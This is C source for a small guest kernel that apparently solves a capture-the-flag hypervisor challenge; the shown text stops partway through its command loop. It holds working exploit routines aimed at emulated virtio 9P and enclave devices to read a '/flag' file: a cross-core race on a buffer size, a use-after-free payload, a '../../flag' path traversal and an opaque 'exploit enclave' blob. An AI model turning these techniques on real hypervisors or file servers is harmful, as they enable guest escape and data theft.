#include <stddef.h>
#include <stdint.h>

#include "interrupts.h"
#include "malloc.h"
#include "p9.h"
#include "virtio_drv.h"
#include "virtio_queue.h"

#define HEAP_SIZE 0x80000
#define BUF_SIZE 0x1000
#define CMD_LOOP 1

#define NUM_CORES 2
#define AP_TRAMPOLINE 0x80000
#define IDT_MAX_DESCRIPTORS 10

#define OGX_READY_IRQ 2
#define P9_RESPONSE_IRQ 9

static int OGX_READY = 0;

char flag[] = "/flag";

int p9_racing_doit = 0;
int p9_ready_to_race = 0;
void* p9_race_addr = NULL;

volatile int p9_intrs = 0;

int _rdmsr(int msr);
void _out(int p, int a);
void _outb(int p, int a);
uint32_t _inb(int p);

void noflag_give_file(char* file);
void exploit_noflag(void);

char getc() {
    return (char)_inb(0x3F8) & 0xff;
}

void kprintc(char c) {
    _outb(c, 0x3F8);
}

void kprints(char* s) {
    while (*s != '\0') {
        kprintc(*s++);
    }
}

void kprinti(int s) {
    char buf[8] = {0};
    unsigned int i = 0;
    for (i = 0; i < 8; i++) {
        char out = s & 0xf;
        out += out < 10 ? 0x30 : 0x37;
        buf[7 - i] = out;
        s >>= 4;
    }

    for (i = 0; i < 8; i++) {
        kprintc(buf[i]);
    }
}

void kprintiln(int s) {
    kprinti(s);
    kprints("\r\n");
}

extern void* isr_stub_table[];

char heap[HEAP_SIZE];
uint8_t* VGA = (uint8_t*)(0xA0000);
uint32_t* ioapic_ptr = (uint32_t*)0xFEC00000;
uint64_t lapic_ptr = 0xfee00000;
uint32_t* net = (uint32_t*)0xe1b00000;
uint32_t* p9 = (uint32_t*)0x9b000000;
int rolling_fid = 0;

struct virtq* p9_rq;

__attribute__((aligned(0x10))) static idt_entry_t idt[256];  // Create an array of IDT entries; aligned for performance
static idtr_t idtr;

void ap_run(int cpu_id) {
    uint32_t apid = 0;

    __asm__ __volatile__("mov $1, %%eax; cpuid; shrl $24, %%ebx;" : "=b"(apid) : :);
    kprints("AP! ");
    kprinti(apid);
    //__asm__ __volatile__ ("hlt;");
    if (p9_racing_doit) {
        p9_ready_to_race = 1;
        kprints("Racer started :)\r\n");
        for (int i = 0;; i++) {
            uint32_t* size = p9_race_addr;
            if (i % 2 == 0) {
                *size = 0x60;
            } else {
                *size = 0xffff;
            }
        }
    }
    while (1) {
    }
}

void intr_handler(int irq) {
    // dispatch interrupt handlers here based on irq
    VGA[0] = 0x86;
    VGA[0] = 0x86;
    // kprinti(irq);
    VGA[0] = irq;
    VGA[0] = 0x86;
    VGA[0] = 0x86;

    switch (irq) {
        case OGX_READY_IRQ:
            OGX_READY = 1;
            break;
        case P9_RESPONSE_IRQ:
            p9_intrs += 1;
            VGA[0] = p9_intrs;
            break;
        default:
            break;
    }

    // Tell our lapic we've serviced the intr
    *((uint32_t*)(lapic_ptr + 8)) = irq;
}

void idt_set_descriptor(uint8_t vector, void* isr, uint8_t flags) {
    idt_entry_t* descriptor = &idt[vector];

    descriptor->isr_low = (uint32_t)isr & 0xFFFF;
    descriptor->kernel_cs = 0x08;  // this value can be whatever offset your kernel code selector is in your GDT
    descriptor->attributes = flags;
    descriptor->isr_high = (uint32_t)isr >> 16;
    descriptor->reserved = 0;
}

void p9_rmesgs(void) {
    p9_rq = setup_virtq(p9, 20, BUF_SIZE, 1);
    commit_and_ready_vq(p9, 1, p9_rq);
}

void p9_wait_for_resp(int idx) {
    p9_msg_t* msg = p9_rq->desc[idx].addr;

    while (!msg->size)
        ;
}

void p9_showrmesgs(void) {
    for (int i = 0; i < 20; i++) {
        p9_msg_t* msg = p9_rq->desc[i].addr;

        if (!msg->size)
            continue;

        kprints("Tag: ");
        kprinti(msg->tag);

        kprints(" Type: ");
        kprintiln(msg->type);

        if (msg->type == P9_RERROR) {
            kprints("Error: ");
            kprints(msg->body + 2);
            kprints("\r\n");
        } else {
            kprints(" printing responses...\r\n");
            uint32_t* addr = p9_rq->desc[i].addr;
            for (int i = 0; i < 10; i++) {
                kprints("\t");
                kprintiln(*addr++);
            }
            kprints("\r\n");
        }
    }
}

void p9_uaf_findflag(void) {
    for (int i = 0; i < 20; i++) {
        p9_msg_t* msg = p9_rq->desc[i].addr;

        if (!msg->size)
            continue;

        kprints("Tag: ");
        kprinti(msg->tag);

        kprints(" Type: ");
        kprintiln(msg->type);

        if (msg->type == P9_RERROR) {
            kprints("Error: ");
            kprints(msg->body + 2);
            kprints("\r\n");
        } else if (msg->type == P9_RREAD) {
            kprints("Read: ");
            kprints(msg->body + 4);
        } else {
            kprints(" printing responses...\r\n");
            uint32_t* addr = p9_rq->desc[i].addr;
            for (int i = 0; i < 10; i++) {
                kprints("\t");
                kprintiln(*addr++);
            }
            kprints("\r\n");
        }
    }
}

void test_p9_race(void) {
    struct virtq* vq0 = setup_virtq(p9, 1, BUF_SIZE, 0);

    p9_race_addr = vq0->desc[0].addr;
    p9_racing_doit = 1;

    int apicbase = _rdmsr(0x1b);
    apicbase &= 0xfffff000;
    uint32_t ap_trampoline = AP_TRAMPOLINE;
    kprinti(apicbase);
    // wake up the other core
    int j = 0;
    for (j = 1; j < NUM_CORES; j++) {
        uint32_t data = ap_trampoline | j;
        *(uint32_t*)(apicbase + 4) = data;
    }

    while (!p9_ready_to_race)
        ;

    kprints("Starting with race...\r\n");
    commit_and_ready_vq(p9, 0, vq0);
}

void test_p9_uaf(void) {
    p9_rmesgs();

    struct virtq* vq0 = setup_virtq(p9, 20, BUF_SIZE, 0);

    p9_version(vq0->desc[0].addr);

    int fid = p9_attach(vq0->desc[1].addr, "pi", "share");

    int clonefid1 = fid + 1;
    clonefid1 = p9_walk(vq0->desc[2].addr, fid, clonefid1, 0, NULL);

    int clonefid2 = clonefid1 + 1;
    clonefid2 = p9_walk(vq0->desc[3].addr, fid, clonefid2, 0, NULL);

    int clonefid3 = clonefid2 + 1;
    clonefid3 = p9_walk(vq0->desc[4].addr, fid, clonefid3, 0, NULL);

    p9_create(vq0->desc[5].addr, clonefid1, "child1", 0777, 2);

    p9_create(vq0->desc[6].addr, clonefid2, "child2", 0777, 2);

    p9_create(vq0->desc[7].addr, clonefid3, "child3", 0777, 2);

    /* char payload[] = "AAAABBBBCCCCDDDD"\ */
    /*   "AAAABBBBCCCCDDDD"\ */
    /*   "AAAABBBBCCCCDDDD"\ */
    /*   "AAAABBBBCCCCDDDD"\ */
    /*   "AAAABBBBCCCCDDDD"\ */
    /*   "AAAABBBBCCCCDDDD"; */

    uint32_t flag_addr = 0x30000000;
    kprinti(flag_addr);
    kprints("\r\n");

    uint32_t flag_add = &flag;
    kprinti(flag_addr);
    kprints("\r\n");

    flag_addr += flag_add;
    kprinti(flag_addr);
    kprints("\r\n");

    uint32_t offset = 0x100000;
    flag_addr -= offset;

    kprinti(flag_addr);
    kprints("\r\n");

    uint8_t payload[12 * 8];
    uint64_t* payload_p = &payload[0];
    for (int i = 0; i < 3; i++) {
        payload_p[i] = flag_addr;
    }

    for (int i = 0; i < 9; i++) {
        payload_p[3 + i] = 0;
    }

    p9_write(vq0->desc[8].addr, clonefid1, 0, payload, 0x60);

    // p9_write(vq0->desc[8].addr, clonefid1, 0, payload, 0x12);

    int uaffid = p9_walk(vq0->desc[9].addr, fid, fid, 0, NULL);

    // UNCOMMENT BELOW FOR UAF
    p9_read(vq0->desc[10].addr, clonefid1, 0, 0x60);
    // p9_read(vq0->desc[10].addr, clonefid1, 0, 0x12);

    p9_open(vq0->desc[11].addr, uaffid, 0);

    p9_read(vq0->desc[12].addr, uaffid, 0, 48);
    // END UAF

    commit_and_ready_vq(p9, 0, vq0);

    // UNCOMMENT BELOW FOR LEAK WITHOUT UAF
    p9_wait_for_resp(0);

    p9_uaf_findflag();

    // END LEAK

    /* void *buf = malloc(BUF_SIZE); */
    /* p9_read(buf, clonefid1, 0, 0x60); */
    /* add_buf(p9, 0, vq0, buf, BUF_SIZE); */
}

void test_p9_cmd(void) {
    uint16_t size = 4;

    p9_rmesgs();

    struct virtq* vq0 = setup_virtq(p9, 20, BUF_SIZE, 0);

    p9_version(vq0->desc[0].addr);

    // commit_and_ready_vq(p9, vq0);

    p9_auth(vq0->desc[1].addr, "pizza", "share");

    // commit_and_ready_vq(p9, vq0);

    int fid = p9_attach(vq0->desc[2].addr, "pizza", "share");

    // commit_and_ready_vq(p9, vq0);

    char* clonewalk[1] = {"abe"};
    int clonefid = fid + 1;
    clonefid = p9_walk(vq0->desc[3].addr, fid, clonefid, 1, clonewalk);

    // commit_and_ready_vq(p9, vq0);

    char* walk[2] = {"abe", "pizza"};
    int openfid = 0x333;
    fid = p9_walk(vq0->desc[4].addr, fid, openfid, 2, walk);

    // commit_and_ready_vq(p9, vq0);

    p9_open(vq0->desc[5].addr, fid, 0);

    // commit_and_ready_vq(p9, vq0);

    p9_read(vq0->desc[6].addr, fid, 2, 40);

    // commit_and_ready_vq(p9, vq0);

    walk[0] = "..";
    int safefid = 0x34;
    int newfid = p9_walk(vq0->desc[7].addr, clonefid, safefid, 1, walk);

    // commit_and_ready_vq(p9, vq0);
    p9_create(vq0->desc[8].addr, newfid, "test", 0777, 1);

    // commit_and_ready_vq(p9, vq0);

    p9_write(vq0->desc[9].addr, newfid, 0, "hello\n", 6);

    // commit_and_ready_vq(p9, vq0);

    p9_clunk(vq0->desc[10].addr, newfid);

    walk[0] = "abe/../../../../flag";
    int nn = safefid + 1;
    p9_walk(vq0->desc[11].addr, safefid, nn, 1, walk);

    commit_and_ready_vq(p9, 0, vq0);

    p9_showrmesgs();
}

void tx_p9_version(struct virtq* vq, int idx) {
    p9_version(vq->desc[idx].addr);

    commit_and_ready_vq(p9, 0, vq);
}

int tx_p9_attach(struct virtq* vq, int idx, char* attach) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_attach\r\n");
        return -1;
    }

    int fid = p9_attach(buf, "pizza", attach);
    add_buf(p9, 0, vq, buf, BUF_SIZE);
    rolling_fid = fid;

    return fid;
}

int tx_p9_walk(struct virtq* vq, int idx, int fid, char* dest) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    int new_fid = ++rolling_fid;
    char* path[1] = {dest};
    new_fid = p9_walk(buf, fid, new_fid, 1, path);
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return new_fid;
}

int tx_p9_create(struct virtq* vq, int idx, int fid, char* file, int is_dir) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    uint32_t perms = 0666;
    if (is_dir) {
        perms = 0777;
        perms |= 0x80000000;
    }

    p9_create(buf, fid, file, perms, 2);
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return fid;
}

int tx_p9_write_file(struct virtq* vq, int idx, int fid, char* content) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    p9_write(buf, fid, 0, content, strlen(content));
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return fid;
}

int tx_p9_read_file(struct virtq* vq, int idx, int fid) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    p9_read(buf, fid, 0, 0xfff);
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return fid;
}

int tx_p9_open_file(struct virtq* vq, int idx, int fid) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    p9_open(buf, fid, 2);
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return fid;
}

int tx_p9_clunk(struct virtq* vq, int idx, int fid) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    p9_clunk(buf, fid);
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return fid;
}

int tx_p9_remove(struct virtq* vq, int idx, int fid) {
    void* buf = malloc(BUF_SIZE);
    if (buf == NULL) {
        kprints("Malloc failed in tx_p9_walk\r\n");
        return -1;
    }

    p9_remove(buf, fid);
    add_buf(p9, 0, vq, buf, BUF_SIZE);

    return fid;
}

p9_msg_t* rx_p9_rmessage(struct virtq* vq, int idx) {
    if (idx == 0) {
        commit_and_ready_vq(p9, 1, vq);

        p9_msg_t* msg = (struct p9_msg_t*)vq->desc[idx].addr;
        while (msg->size == 0)
            ;
        return msg;
    } else {
        void* buf = malloc(BUF_SIZE);
        if (buf == NULL) {
            kprints("Malloc failed in rx_p9_message\r\n");
            return -1;
        }
        p9_msg_t* msg = (struct p9_msg_t*)buf;
        msg->size = 0;

        add_buf(p9, 1, vq, buf, BUF_SIZE);

        while (msg->size == 0)
            ;
        return msg;
    }
}

void tx_pkt(char* pkt_data, uint16_t size, struct virtq* vq, int idx) {
    ((uint16_t*)vq->desc[idx].addr)[0] = size;

    for (int i = 0; i < size; i++) {
        ((char*)vq->desc[idx].addr)[i + 2] = pkt_data[i];
    }

    commit_and_ready_vq(net, 1, vq);
}

void test_pkt_tx(struct virtq* vq, int idx) {
    char* pkt_data = "DSTMACSRCMACLN\x61TLIDFOTP11IPIPDTDTDTDTAAA";
    uint16_t size = 40;

    tx_pkt(pkt_data, size, vq, idx);
}

void test_ipv4_pkt_tx(struct virtq* vq, int idx) {
    char* pkt_data = "DSTMACSRCMACLN\x45GTLIDFOTP__IPIPDTDTDTDTAA";
    uint16_t size = 40;

    tx_pkt(pkt_data, size, vq, idx);
}

void test_pkt_rx(struct virtq* vq, int idx) {
    commit_and_ready_vq(net, 2, vq);

    uint16_t size = ((uint16_t*)vq->desc[idx].addr)[0];

    kprinti(size);
    kprintc('\n');

    for (int i = 0; i < size; i++) {
        kprintc(((char*)vq->desc[idx].addr)[2 + i]);
    }
}

void net_set_driver_features() {
    // set the high bits to zero
    net[REG_DRIVER_FEATURES_SELECT / 4] = 1;
    net[REG_DRIVER_FEATURES / 4] = 0x0;

    net[REG_DRIVER_FEATURES_SELECT / 4] = 0;
    // 111111
    net[REG_DRIVER_FEATURES / 4] = 0x3f;
}

void net_send_ctrl_message(struct virtq* vq, int idx, uint8_t ctrl, uint8_t data) {
    ((uint8_t*)vq->desc[idx].addr)[0] = (uint8_t)ctrl;
    ((uint8_t*)vq->desc[idx].addr)[1] = (uint8_t)data;
    commit_and_ready_vq(net, 0, vq);
}

uint32_t* OGX = (uint32_t*)0xefff0000;
const size_t OGX_RQ_ID = 0;
const size_t OGX_WQ_ID = 1;
static const uint8_t OGX_LOAD_SIGNAL_ENCLAVE[] = {
    0xa3, 0x61, 0x6d, 0x98, 0x5c, 0x18, 0xf7, 0x18, 0x73, 0x18, 0xa6, 0x18, 0x83, 0x18, 0x4e, 0x18, 0x4a, 0x18, 0xca,
    0x18, 0x6d, 0x18, 0xf7, 0x18, 0xda, 0x18, 0x3b, 0x18, 0xe1, 0x18, 0xa2, 0x18, 0x29, 0x18, 0x8f, 0x18, 0x84, 0x18,
    0x8e, 0x18, 0xd6, 0x18, 0xa8, 0x18, 0x2b, 0x18, 0x9d, 0x18, 0xa4, 0x18, 0xc2, 0x18, 0x55, 0x18, 0xad, 0x18, 0xaa,
    0x18, 0xf7, 0x11, 0x18, 0x6f, 0x18, 0x92, 0x17, 0x18, 0x45, 0x11, 0x18, 0xc1, 0x03, 0x18, 0xa6, 0x18, 0xef, 0x18,
    0xff, 0x18, 0xae, 0x18, 0xe6, 0x18, 0x91, 0x18, 0xe2, 0x18, 0x1a, 0x18, 0x86, 0x18, 0x5d, 0x18, 0x9b, 0x18, 0xa1,
    0x18, 0x3d, 0x18, 0xe4, 0x18, 0x48, 0x15, 0x18, 0xf2, 0x18, 0x8a, 0x18, 0xef, 0x18, 0x84, 0x18, 0xa9, 0x18, 0x51,
    0x18, 0x4f, 0x18, 0x79, 0x18, 0x34, 0x18, 0x22, 0x18, 0xd2, 0x18, 0x67, 0x18, 0x9c, 0x18, 0x70, 0x18, 0xbb, 0x18,
    0x44, 0x18, 0x6e, 0x0f, 0x18, 0xa9, 0x18, 0x63, 0x18, 0xcf, 0x18, 0xd4, 0x04, 0x18, 0x89, 0x18, 0x35, 0x18, 0x4a,
    0x18, 0xe8, 0x18, 0x5d, 0x18, 0x3e, 0x18, 0x41, 0x18, 0x5f, 0x18, 0x96, 0x18, 0xbd, 0x18, 0x58, 0x18, 0x8e, 0x18,
    0x34, 0x18, 0xf0, 0x18, 0xcf, 0x18, 0xb1, 0x18, 0x53, 0x18, 0x47, 0x61, 0x6e, 0x98, 0x18, 0x18, 0xdc, 0x18, 0xab,
    0x18, 0xb8, 0x18, 0xea, 0x18, 0x8a, 0x10, 0x18, 0x86, 0x18, 0xa3, 0x18, 0x55, 0x18, 0xda, 0x18, 0xab, 0x18, 0x68,
    0x18, 0xf3, 0x18, 0x4b, 0x18, 0xb9, 0x18, 0xe5, 0x18, 0x3f, 0x18, 0xc6, 0x18, 0xb2, 0x18, 0x3e, 0x18, 0xb8, 0x0a,
    0x18, 0x72, 0x18, 0x99, 0x61, 0x73, 0x98, 0x20, 0x18, 0x45, 0x18, 0xb7, 0x18, 0xbd, 0x18, 0xf7, 0x18, 0xa2, 0x18,
    0xf2, 0x18, 0xc1, 0x18, 0x6f, 0x18, 0x38, 0x18, 0xb1, 0x18, 0xdd, 0x18, 0xab, 0x18, 0x2f, 0x18, 0x58, 0x18, 0x5f,
    0x18, 0x44, 0x18, 0x9d, 0x18, 0xc3, 0x18, 0x9b, 0x18, 0x6c, 0x18, 0xfb, 0x18, 0x68, 0x18, 0x37, 0x18, 0xb7, 0x18,
    0x87, 0x18, 0xad, 0x18, 0x6c, 0x18, 0x3e, 0x18, 0x60, 0x18, 0x6e, 0x18, 0x2c, 0x14};
static const uint8_t OGX_LOAD_EXPLOIT_ENCLAVE[] = {
    0xa3, 0x61, 0x6d, 0x98, 0x3a, 0x18, 0x28, 0x0e, 0x18, 0x20, 0x03, 0x18, 0xe7, 0x18, 0x76, 0x18, 0xaf, 0x18,
    0xfa, 0x18, 0x6f, 0x18, 0x77, 0x18, 0xe5, 0x18, 0x50, 0x18, 0x8c, 0x18, 0x49, 0x18, 0x7c, 0x18, 0xcd, 0x05,
    0x18, 0xca, 0x18, 0xd9, 0x18, 0xf6, 0x18, 0x48, 0x18, 0x29, 0x18, 0x7f, 0x18, 0x29, 0x18, 0x9f, 0x18, 0x64,
    0x18, 0x99, 0x18, 0xb3, 0x18, 0xda, 0x18, 0xe8, 0x18, 0x4a, 0x18, 0x48, 0x18, 0x7e, 0x18, 0x79, 0x07, 0x04,
    0x18, 0x72, 0x18, 0xbd, 0x18, 0xcf, 0x18, 0xc5, 0x18, 0x7f, 0x18, 0x79, 0x0e, 0x18, 0x6f, 0x18, 0x80, 0x18,
    0xd2, 0x18, 0x75, 0x18, 0x87, 0x18, 0x66, 0x18, 0x2b, 0x0b, 0x18, 0xb8, 0x18, 0xf4, 0x18, 0x68, 0x18, 0xdc,
    0x18, 0x2f, 0x18, 0x5a, 0x18, 0xcc, 0x61, 0x6e, 0x98, 0x18, 0x18, 0x9f, 0x18, 0x43, 0x18, 0x9c, 0x00, 0x18,
    0xf0, 0x18, 0xb6, 0x18, 0xe1, 0x18, 0xda, 0x18, 0x19, 0x18, 0xb3, 0x18, 0xc2, 0x18, 0xff, 0x18, 0x9b, 0x18,
    0x51, 0x18, 0xd9, 0x18, 0xc1, 0x18, 0x49, 0x18, 0xd0, 0x18, 0xcd, 0x18, 0xce, 0x18, 0xaf, 0x0a, 0x18, 0x7e,
    0x18, 0x18, 0x61, 0x73, 0x98, 0x20, 0x18, 0x45, 0x18, 0xb7, 0x18, 0xbd, 0x18, 0xf7, 0x18, 0xa2, 0x18, 0xf2,
    0x18, 0xc1, 0x18, 0x6f, 0x18, 0x38, 0x18, 0xb1, 0x18, 0xdd, 0x18, 0xab, 0x18, 0x2f, 0x18, 0x58, 0x18, 0x5f,
    0x18, 0x44, 0x18, 0x9d, 0x18, 0xc3, 0x18, 0x9b, 0x18, 0x6c, 0x18, 0xfb, 0x18, 0x68, 0x18, 0x37, 0x18, 0xb7,
    0x18, 0x87, 0x18, 0xad, 0x18, 0x6c, 0x18, 0x3e, 0x18, 0x60, 0x18, 0x6e, 0x18, 0x2c, 0x14};

void test_ogx() {
    // Set up the read queue
    kprints("setting up ogx read queue\r\n");
    struct virtq* ogx_rq = setup_virtq(OGX, 3, BUF_SIZE, OGX_RQ_ID);
    ((uint16_t*)ogx_rq->desc[0].addr)[0] = 0;
    ((uint16_t*)ogx_rq->desc[1].addr)[0] = 0;
    ((uint16_t*)ogx_rq->desc[2].addr)[0] = 0;
    commit_and_ready_vq(OGX, OGX_RQ_ID, ogx_rq);

    // Create the write queue
    kprints("setting up ogx write queue\r\n");
    struct virtq* ogx_wq = setup_virtq(OGX, 1, BUF_SIZE, OGX_WQ_ID);

    // Load the signal enclave
    kprints("loading signal enclave to evict enclave 0\r\n");
    ((uint16_t*)ogx_wq->desc[0].addr)[0] = sizeof(OGX_LOAD_SIGNAL_ENCLAVE);
    for (size_t i = 0; i < sizeof(OGX_LOAD_SIGNAL_ENCLAVE); ++i) {
        ((uint8_t*)ogx_wq->desc[0].addr)[i + 2] = OGX_LOAD_SIGNAL_ENCLAVE[i];
    }
    commit_and_ready_vq(OGX, OGX_WQ_ID, ogx_wq);

    // "Read" off two enclave responses -- we can't decrypt them, so just wait for the notifications
    kprints("waiting for signal enclave response\r\n");
    while (!((uint16_t*)ogx_rq->desc[0].addr)[0]) {
    }

    kprints("waiting for flag enclave response\r\n");
    while (!((uint16_t*)ogx_rq->desc[1].addr)[0]) {
    }

    // Load the exploit enclave
    kprints("loading exploit enclave into old flag enclave\r\n");
    void* exploit_buffer = malloc(0x1000);
    ((uint16_t*)exploit_buffer)[0] = sizeof(OGX_LOAD_EXPLOIT_ENCLAVE);
    for (size_t i = 0; i < sizeof(OGX_LOAD_EXPLOIT_ENCLAVE); ++i) {
        ((uint8_t*)exploit_buffer)[i + 2] = OGX_LOAD_EXPLOIT_ENCLAVE[i];
    }
    add_buf(OGX, OGX_WQ_ID, ogx_wq, exploit_buffer, 0x1000);

    // Read off the flag response
    kprints("waiting for exploit enclave response\r\n");
    while (!((uint16_t*)ogx_rq->desc[2].addr)[0]) {
    }

    // Print it out
    int sum = 0;
    kprints("flag response: ");
    const uint16_t response_size = *((uint16_t*)ogx_rq->desc[2].addr);
    for (size_t i = 0; i < response_size; ++i) {
        sum ^= ((uint8_t*)ogx_rq->desc[2].addr)[i + 2];
        kprinti(((uint8_t*)ogx_rq->desc[2].addr)[i + 2]);
        kprints(" ");
        if ((i % 16) == 15) {
            kprints("\r\n");
        }
    }
    kprints("\r\nciphertext sum: ");
    kprinti(sum);
    kprints("\r\n");
}

uint8_t read_u8() {
    return getc();
}

uint16_t read_u16() {
    uint16_t x;
    uint8_t a = getc();
    uint8_t b = getc();
    if (a == 0xff) {
        a = 0;
    }
    if (b == 0xff) {
        b = 0;
    }
    x = a | (b << 8);
    // kprints("u16=");
    // kprintiln(x);
    return x;
}

void test_ogx_patch() {
    const size_t max_enclaves = 16;
    struct virtq* ogx_rq = setup_virtq(OGX, max_enclaves, BUF_SIZE, OGX_RQ_ID);
    for (size_t i = 0; i < max_enclaves; ++i) {
        ((uint16_t*)ogx_rq->desc[i].addr)[0] = 0;
    }
    commit_and_ready_vq(OGX, OGX_RQ_ID, ogx_rq);

    struct virtq* ogx_wq = setup_virtq(OGX, 1, BUF_SIZE, OGX_WQ_ID);

    for (size_t num_enclaves = 0; num_enclaves < max_enclaves; ++num_enclaves) {
        // Read in an enclave and load it
        const uint16_t enclave_size = read_u16();
        if (enclave_size == 0) {
            break;
        }
        if (enclave_size > BUF_SIZE) {
            kprints("enclave is too large\r\n");
            break;
        }

        if (num_enclaves == 0) {
            ((uint16_t*)ogx_wq->desc[0].addr)[0] = enclave_size;
            for (size_t i = 0; i < enclave_size; ++i) {
                ((uint8_t*)ogx_wq->desc[0].addr)[i + 2] = read_u8();
            }
            commit_and_ready_vq(OGX, OGX_WQ_ID, ogx_wq);
        } else {
            uint8_t* enclave_buffer = malloc(enclave_size);
            ((uint16_t*)enclave_buffer)[0] = enclave_size;
            for (size_t i = 0; i < enclave_size; ++i) {
                enclave_buffer[i + 2] = read_u8();
            }
            add_buf(OGX, OGX_WQ_ID, ogx_wq, enclave_buffer, enclave_size);
        }

        // Read out a response and print it
        while (!((uint16_t*)ogx_rq->desc[num_enclaves].addr)[0]) {
        }

        const uint16_t response_size = *((uint16_t*)ogx_rq->desc[num_enclaves].addr);
        kprintiln(response_size);
        for (size_t i = 0; i < response_size; ++i) {
            kprintiln(((uint8_t*)ogx_rq->desc[num_enclaves].addr)[i + 2]);
        }

        // Handle the flag enclave if necessary
        // if (num_enclaves == 7) {
        //     ++num_enclaves;
        //     while (!((uint16_t*)ogx_rq->desc[num_enclaves].addr)[0]) {
        //     }
        //
        //     const uint16_t flag_response_size = *((uint16_t*)ogx_rq->desc[num_enclaves].addr);
        //     kprintiln(flag_response_size);
        //     for (size_t i = 0; i < flag_response_size; ++i) {
        //         kprintiln(((uint8_t*)ogx_rq->desc[num_enclaves].addr)[i + 2]);
        //     }
        // }
    }

    kprints("ogx patch testing finished\r\n");
}

void idt_init(int cpu_id) {
    idtr.base = (uintptr_t)&idt[0];
    idtr.limit = (uint16_t)sizeof(idt_entry_t) * IDT_MAX_DESCRIPTORS - 1;

    for (uint8_t vector = 0; vector < 32; vector++) {
        idt_set_descriptor(vector, isr_stub_table[vector], 0x8E);
        // vectors[vector] = true;
    }

    __asm__ volatile("lidt %0" : : "memory"(idtr));  // load the new IDT
    __asm__ volatile("sti");                         // set the interrupt flag
}

void program_ioapic(void) {
    uint32_t TABLE_OFF = 2;
    uint16_t dest_cpu;
    uint16_t dest_vector;
    uint32_t irq_entry;
    int i;
    // for now we'll just set all entries to alert cpu 0 (BSP)
    // and set the vector to the irq
    for (i = 0; i < IDT_MAX_DESCRIPTORS; i++) {
        dest_cpu = 0;
        dest_vector = i;
        irq_entry = ((uint32_t)dest_cpu) << 16 | dest_vector;
        ioapic_ptr[TABLE_OFF + i] = irq_entry;
    }
}

void kernel_main(int cpu_id) {
    // all cpus should have their IDT initialized
    idt_init(cpu_id);

    if (cpu_id != 0) {
        ap_run(cpu_id);
    }

    program_ioapic();

    malloc_init(heap, HEAP_SIZE);

    struct virtq* net_vq0 = NULL;  // setup_virtq(net, 10, BUF_SIZE, 0);
    int net_vq0_idx = 0;

    struct virtq* net_vq1 = NULL;  // setup_virtq(net, 20, BUF_SIZE, 1);
    int net_vq1_idx = 0;

    struct virtq* net_vq2 = NULL;  // setup_virtq(net, 10, BUF_SIZE, 2);
    int net_vq2_idx = 0;

    struct virtq* p9_vq0 = NULL;
    int p9_vq0_idx = 0;

    struct virtq* p9_vq1 = NULL;
    int p9_vq1_idx = 0;

    int base_fid = 0;
    int operative_fid = 0;

    kprints("OOO OS BOOTED\r\n");
    int i = 0;
    char* cmd = malloc(128);
    if (CMD_LOOP) {
        while (1) {
            char c = 0;
            memset(cmd, 0, 128);
            kprints("$ ");
            for (i = 0; i < 128; i++) {
                c = getc();
                if (c == '\r' || c == '\n') {
                    kprintc('\r');
                    kprintc('\n');
                    break;
                } else
                    kprintc(c);
                cmd[i] = c;
            }

            // full
            if (i == 128) {
                kprints("invalid command size\r\n");
                continue;
            }

            // empty
            if (i == 0) {
                continue;
            }

            if (!strcmp(cmd, "prepare_net")) {
                net_vq0 = setup_virtq(net, 10, BUF_SIZE, 0);
                net_vq1 = setup_virtq(net, 20, BUF_SIZE, 1);
                net_vq2 = setup_virtq(net, 10, BUF_SIZE, 2);
            } else if (!strcmp(cmd, "prepare_p9")) {
                p9_vq0 = setup_virtq(p9, 1, BUF_SIZE, 0);
                p9_vq1 = setup_virtq(p9, 1, BUF_SIZE, 1);
            } else if (!strcmp(cmd, "noflag")) {
                exploit_noflag();
            } else if (!strcmp(cmd, "set_video")) {
                _outb(0x13, 0x3b0);
                VGA[0] = 0x41;
            } else if (!strncmp(cmd, "noflag_file ", 12)) {
                char* file = cmd + 12;
                noflag_give_file(file);
            } else if (!strcmp(cmd, "launchap")) {
                int apicbase = _rdmsr(0x1b);
                apicbase &= 0xfffff000;
                uint32_t ap_trampoline = AP_TRAMPOLINE;
                kprinti(apicbase);
                // wake up the other core
                int j = 0;
                for (j = 1; j < NUM_CORES; j++) {
                    uint32_t data = ap_trampoline | j;
                    *(uint32_t*)(apicbase + 4) = data;
                }
            } else if (!strcmp(cmd, "write")) {
                _outb(0x41414141, 0x92);
                _outb(0x42, 0x95);
            } else if (!strcmp(cmd, "p9race")) {
                test_p9_race();
            } else if (!strcmp(cmd, "p9uaf")) {
                test_p9_uaf();
            } else if (!strcmp(cmd, "p9")) {
                test_p9_cmd();
            } else if (!strcmp(cmd, "p9_version")) {
                tx_p9_version(p9_vq0, p9_vq0_idx);
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                kprints(msg->body + 6);
                p9_vq0_idx++;
                p9_vq1_idx++;
            } else if (!strncmp(cmd, "p9_attach ", 10)) {  // mount a share
                char* share = cmd + 10;
                base_fid = tx_p9_attach(p9_vq0, p9_vq0_idx, share);
                operative_fid = base_fid;
                p9_msg_t* msg = rx_p9_rmessage(p9_vq1, p9_vq1_idx);
                if (msg->type == P9_RERROR) {
                    kprints("FAILED attach to share\r\n");
                } else {
                    kprintiln(base_fid);
                }
                // TODO inc vq1_idx here?
            } else if (!strncmp(cmd, "p9_walk ", 8)) {
                char* dest = cmd + 8;
